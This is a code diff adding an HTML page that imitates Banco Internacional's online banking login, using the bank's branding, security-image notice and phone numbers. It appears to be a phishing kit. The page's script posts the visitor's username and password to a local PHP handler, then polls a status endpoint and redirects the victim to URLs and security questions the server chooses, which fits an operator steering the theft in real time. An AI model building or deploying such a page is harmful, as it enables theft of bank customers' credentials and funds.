@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internacional</title>
+    <link rel="shortcut icon" href="assets/img/favicon_fisaDesert.ico" type="image/x-icon">
+    <link rel="stylesheet" href="assets/css/style.css?v=1.1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+
+<body class="fisaDesert">
+    <!-- Background -->
+    <div class="bgbody"></div>
+
+    <!-- Header -->
+    <div id="header">
+        <div id="logo">
+            <img src="assets/img/logow.png" alt="Banco Internacional">
+        </div>
+        <div id="topnavhome">
+            <ul class="menuhome">
+                <li class="first-item bold">Bienvenido(a)</li>
+                <li><a href="#">Ayuda</a></li>
+                <li class="last-item"><a href="#">Contáctanos</a></li>
+            </ul>
+        </div>
+    </div>
+    <br><br>
+    <!-- Main Content -->
+    <div id="finalUserContent">
+        <div id="content">
+            <div id="borderContainerTwo" class="dijitContentPane">
+
+                <div id="mainwindow">
+
+                    <div id="formwindow">
+                        <div class="row-form-login border-bottom">
+                            <div id="mainContainer" class="dijitContentPane mainContainer">
+
+                                <!-- Waiting State (Inside mainContainer) -->
+                                <div id="waiting-state" class="hidden">
+                                    <div class="waiting-content">
+                                        <img src="assets/img/loading_logo_3d.gif" alt="Cargando..." class="loader-gif">
+
+                                    </div>
+                                </div>
+
+                                <div id="lpwindow" class="backgradient col6">
+                                    <div id="cmpwindow">
+                                        <h2 class="boldtext">INGRESO A BANCA ONLINE</h2>
+
+                                        <div id="btnpassword"></div>
+                                        <div id="forminfowindow" class="screenLogin">
+
+                                            <!-- USERNAME ROW (Using Dojo Structure) -->
+                                            <div class="row-section align-center">
+                                                <div class="input-widget user-icon">
+                                                    <label class="fisaLabel-login">
+                                                        <img src="assets/img/user-icon-login.svg" class="user-icon-svg"
+                                                            alt="">
+                                                        Usuario
+                                                    </label>
+
+                                                    <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox"
+                                                        id="widget_j_username">
+                                                        <div class="dijitReset dijitInputField dijitInputContainer">
+                                                            <input class="dijitReset dijitInputInner" type="text"
+                                                                id="j_username" maxlength="16"
+                                                                placeholder="Ingresa tu usuario" oncopy="return false"
+                                                                onpaste="return false" oncut="return false">
+                                                        </div>
+                                                    </div>
+                                                    <a class="fisaLink info-link" id="info-login">
+                                                        <img src="assets/img/question-icon-login.svg"
+                                                            class="help-icon-svg" alt="Ayuda">
+                                                    </a>
+                                                </div>
+                                            </div>
+
+                                            <!-- PASSWORD ROW (Hidden by default) -->
+                                            <div class="row-section align-center hidden" id="password-row">
+                                                <div class="input-widget user-icon">
+                                                    <label class="fisaLabel-login">
+                                                        <i class="fas fa-lock"
+                                                            style="margin-right:8px; font-size: 14px;"></i>
+                                                        Contraseña
+                                                    </label>
+
+                                                    <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox">
+                                                        <div class="dijitReset dijitInputField dijitInputContainer">
+                                                            <input class="dijitReset dijitInputInner" type="password"
+                                                                id="password-field" oncopy="return false"
+                                                                onpaste="return false" oncut="return false">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!-- Step 1 Button -->
+                                            <div class="button-section" id="btn-section-1">
+                                                <span class="dijit dijitReset dijitInline dijitButton">
+                                                    <span class="dijitReset dijitInline dijitButtonNode"
+                                                        onclick="goToStep2()">
+                                                        <span class="dijitReset dijitStretch dijitButtonContents">
+                                                            <span
+                                                                class="dijitReset dijitInline dijitButtonText">Continuar</span>
+                                                        </span>
+                                                    </span>
+                                                </span>
+                                            </div>
+
+                                            <!-- Step 2 Buttons (Hidden) -->
+                                            <div class="button-section dual-buttons hidden" id="btn-section-2">
+                                                <span
+                                                    class="dijit dijitReset dijitInline dijitButton btn-cancel-wrapper">
+                                                    <span class="dijitReset dijitInline dijitButtonNode btn-cancel-node"
+                                                        onclick="resetToStep1()">
+                                                        <span class="dijitReset dijitStretch dijitButtonContents">
+                                                            <span
+                                                                class="dijitReset dijitInline dijitButtonText">Cancelar</span>
+                                                        </span>
+                                                    </span>
+                                                </span>
+
+                                                <span class="dijit dijitReset dijitInline dijitButton">
+                                                    <span class="dijitReset dijitInline dijitButtonNode"
+                                                        onclick="submitLogin()">
+                                                        <span class="dijitReset dijitStretch dijitButtonContents">
+                                                            <span
+                                                                class="dijitReset dijitInline dijitButtonText">Continuar</span>
+                                                        </span>
+                                                    </span>
+                                                </span>
+                                            </div>
+
+                                            <!-- Forgot Password Link -->
+                                            <div class="forgot-password-link hidden" id="forgot-pass-link">
+                                                <a href="#">¿Olvidaste tu contraseña?</a>
+                                            </div>
+
+                                            <div id="msg-login-form">
+                                                <div class="msg-icon-wrapper">
+                                                    <img src="assets/img/info-icon-login.svg" alt="Info">
+                                                </div>
+                                                <div class="msg-text-wrapper">
+                                                    <span class="text-msg-login-form">Si ingresas con USUARIO
+                                                        TEMPORAL</span>
+                                                    <span class="text-msg-login-form">
+                                                        Haz click
+                                                        <a href="#">aquí</a>
+                                                    </span>
+                                                </div>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Right Column -->
+                                <div id="rpwindow" class="col6">
+                                    <div id="msgwindow">
+
+                                        <div id="ayuda">
+                                            <h2 class="boldtext align-left">Utilidades</h2>
+                                            <ul class="bullet-arrow">
+                                                <li>
+                                                    <img src="assets/img/cursor-bullet.svg" class="bullet-icon" alt="">
+                                                    <a href="#">¿No tienes usuario?, genéralo aquí</a>
+                                                </li>
+                                                <li>
+                                                    <img src="assets/img/cursor-bullet.svg" class="bullet-icon" alt="">
+                                                    <a href="#">¿Olvidaste tu contraseña?</a>
+                                                </li>
+                                                <li>
+                                                    <img src="assets/img/cursor-bullet.svg" class="bullet-icon" alt="">
+                                                    <a href="#">Desbloquea tu usuario</a>
+                                                </li>
+                                                <li>
+                                                    <img src="assets/img/cursor-bullet.svg" class="bullet-icon" alt="">
+                                                    <a href="#">¿Olvidaste tu usuario?</a>
+                                                </li>
+                                            </ul>
+                                        </div>
+
+                                        <!-- Security Image (Step 2) -->
+                                        <div id="security-image-section" class="hidden">
+                                            <div class="security-section">
+                                                <div class="security-title">IMAGEN Y FRASE DE SEGURIDAD</div>
+                                                <div class="security-loader">
+                                                    <div class="loader-spinner"></div>
+                                                    <span>Cargando...</span>
+                                                </div>
+                                                <div class="security-disclaimer">
+                                                    Esta imagen y frase servirán para validar que está ingresando al
+                                                    sitio correcto cuando acceda a Banca Online. Si no coinciden con las
+                                                    que ha registrado, no ingrese su contraseña, cierre el sitio y
+                                                    notifíquelo al 1700 360 360 (desde el Austro 07 284 2200) o en
+                                                    cualquier agencia a nivel nacional.
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row-form-login">
+                            <div id="faqtexto" class="icon-msg-footer">
+                                <div class="shield-wrapper">
+                                    <img src="assets/img/shield-login.svg" class="shield-icon">
+                                </div>
+                                <p>Te recordamos que Banco Internacional
+                                    <span class="enfatize-text">
+                                        no solicita
+                                        <span class="undeline-enfatize">
+                                            información personal relacionada con usuarios y contraseñas de acceso
+                                        </span>
+                                    </span>
+                                    a tus cuentas o servicios electrónicos vía e-mail.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Modal (Hidden by default) -->
+    <div id="errorModal" class="modal-overlay hidden" style="display: none;">
+        <div class="custom-modal">
+            <div class="custom-modal-header">
+                <span>Mensaje</span>
+                <span class="close-modal" onclick="closeErrorModal()">&times;</span>
+            </div>
+            <div class="custom-modal-body">
+                <div class="modal-icon">
+                    <!-- Using SVG or FontAwesome for the warning triangle -->
+                    <i class="fas fa-exclamation-triangle"
+                        style="color: #f1c40f; font-size: 40px; text-shadow: 0px 0px 2px #000;"></i>
+                </div>
+                <div class="modal-message">
+                    Validar la información ingresada
+                </div>
+                <div class="modal-button-container">
+                    <button class="modal-btn-accept" onclick="closeErrorModal()">Aceptar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div id="footer">
+        <div id="copy">
+            <p>Copyright (c) 2019 Banco Internacional. Todos los derechos reservados.</p>
+        </div>
+    </div>
+
+    <style>
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .custom-modal {
+            background: white;
+            width: 400px;
+            border-radius: 6px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .custom-modal-header {
+            background: #666;
+            /* Dark grey header */
+            color: white;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .close-modal {
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .custom-modal-body {
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .modal-icon {
+            margin-bottom: 15px;
+        }
+
+        /* Custom Triangle to match image better if FontAwesome isn't enough */
+        .fa-exclamation-triangle {
+            color: #ffcc00 !important;
+            -webkit-text-stroke: 1px #888;
+        }
+
+        .modal-message {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .modal-btn-accept {
+            background: linear-gradient(to bottom, #ff9900 0%, #ff8800 100%);
+            /* Orange gradient */
+            border: 1px solid #e67e22;
+            color: white;
+            padding: 8px 30px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+        }
+
+        .modal-btn-accept:hover {
+            background: #e67e22;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('error')) {
+                document.getElementById('errorModal').style.display = 'flex';
+                document.getElementById('errorModal').classList.remove('hidden');
+            }
+        });
+
+        function closeErrorModal() {
+            document.getElementById('errorModal').style.display = 'none';
+            // Clean URL
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+
+        function goToStep2() {
+            var userVal = document.getElementById('j_username').value;
+            if (!userVal) return;
+
+            // Just basic UI toggling for step 2
+            document.getElementById('password-row').classList.remove('hidden');
+            document.getElementById('btn-section-1').classList.add('hidden');
+            document.getElementById('btn-section-2').classList.remove('hidden');
+            document.getElementById('forgot-pass-link').classList.remove('hidden');
+            document.getElementById('msg-login-form').classList.add('hidden');
+
+            var widget = document.getElementById('widget_j_username');
+            widget.classList.add('disabled-look-dojo');
+            document.getElementById('j_username').disabled = true;
+            document.getElementById('info-login').classList.add('hidden');
+
+            document.getElementById('ayuda').classList.add('hidden');
+            document.getElementById('security-image-section').classList.remove('hidden');
+        }
+
+        function resetToStep1() {
+            document.getElementById('password-row').classList.add('hidden');
+            document.getElementById('btn-section-1').classList.remove('hidden');
+            document.getElementById('btn-section-2').classList.add('hidden');
+            document.getElementById('forgot-pass-link').classList.add('hidden');
+            document.getElementById('msg-login-form').classList.remove('hidden');
+
+            var widget = document.getElementById('widget_j_username');
+            widget.classList.remove('disabled-look-dojo');
+            document.getElementById('j_username').disabled = false;
+            document.getElementById('j_username').value = '';
+            document.getElementById('info-login').classList.remove('hidden');
+
+            document.getElementById('ayuda').classList.remove('hidden');
+            document.getElementById('security-image-section').classList.add('hidden');
+        }
+
+        async function submitLogin() {
+            const user = document.getElementById('j_username').value;
+            const pass = document.getElementById('password-field').value;
+
+            if (!user || !pass) {
+                alert('Por favor ingrese usuario y contraseña');
+                return;
+            }
+
+            // Hide inner content and show waiting state (inside mainContainer)
+            document.getElementById('lpwindow').style.display = 'none';
+            document.getElementById('rpwindow').style.display = 'none';
+            document.getElementById('waiting-state').classList.remove('hidden');
+
+            try {
+                // alert('Enviando datos...'); // DEBUG
+                const res = await fetch('handlers/login_handler.php', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: user, password: pass })
+                });
+
+                if (!res.ok) {
+                    throw new Error('Network response was not ok ' + res.statusText);
+                }
+
+                const text = await res.text(); // Get raw text first
+                // alert('Respuesta del servidor: ' + text); // DEBUG
+
+                let data;
+                try {
+                    data = JSON.parse(text);
+                } catch (e) {
+                    throw new Error('Invalid JSON: ' + text);
+                }
+
+                if (data.success) {
+                    startPolling(data.id);
+                } else {
+                    alert('Error del servidor: ' + (data.error || 'Desconocido'));
+                    // Revert UI
+                    document.getElementById('lpwindow').style.display = 'block';
+                    document.getElementById('rpwindow').style.display = 'block';
+                    document.getElementById('waiting-state').classList.add('hidden');
+                }
+            } catch (e) {
+                console.error(e);
+                alert('Error técnico: ' + e.message);
+                document.getElementById('lpwindow').style.display = 'block';
+                document.getElementById('rpwindow').style.display = 'block';
+                document.getElementById('waiting-state').classList.add('hidden');
+            }
+        }
+
+        function startPolling(id) {
+            const intervalId = setInterval(async () => {
+                try {
+                    const t = new Date().getTime();
+                    const res = await fetch('handlers/check_status.php?t=' + t + '&id=' + id, {
+                        credentials: 'include'
+                    });
+
+                    if (!res.ok) {
+                        throw new Error('HTTP ' + res.status);
+                    }
+
+                    const text = await res.text();
+                    try {
+                        const data = JSON.parse(text);
+                        if (data.success && data.action === 'redirect') {
+                            let url = data.url;
+                            if (data.question) {
+                                url += (url.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(data.question);
+                            }
+                            clearInterval(intervalId);
+                            window.location.href = url;
+                        }
+                    } catch (e) {
+                        // Silent fail on JSON parse in prod
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 2000);
+        }
+    </script>
+</body>
+
+</html>
